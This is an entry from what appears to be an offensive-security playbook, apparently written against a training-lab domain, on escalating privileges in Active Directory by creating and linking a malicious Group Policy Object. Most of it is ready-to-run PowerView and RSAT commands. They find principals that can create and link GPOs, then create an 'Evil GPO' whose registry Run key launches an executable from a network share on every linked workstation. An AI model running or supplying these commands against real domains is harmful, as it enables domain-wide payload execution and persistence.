title: Creating a new GPO Privilege Escalation
category: 
  - AD:
    - ACL:
      - GPO  
tactic: Privilege Escalation
tags: []
description:
  - title: 
    content: Group Policy Objects are stored in CN=Policies,CN=System - principals that can 
      create new GPOs in the domain have the "Create groupPolicyContainer objects" privilege over this object. 
steps:
  - description: Enumerate
    options: 
      - tool: Powerview.ps1
        usage: |
          Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
          
          #Being able to create a GPO doesn't achieve anything unless it can be linked to an OU.  The ability to link a GPO to an OU is controlled on the OU itself by granting "Write gPLink" privileges.
          Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl
      
  - description: Let's resolve the GPO name and the SID of the principal.
    options: 
      - tool: Powerview.ps1
        usage: Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
  
  - description: Modify the GPO
    options: 
      - tool: RSAT
        usage: |
          New-GPO -Name "Evil GPO"  
          Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString
          Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
comments:
  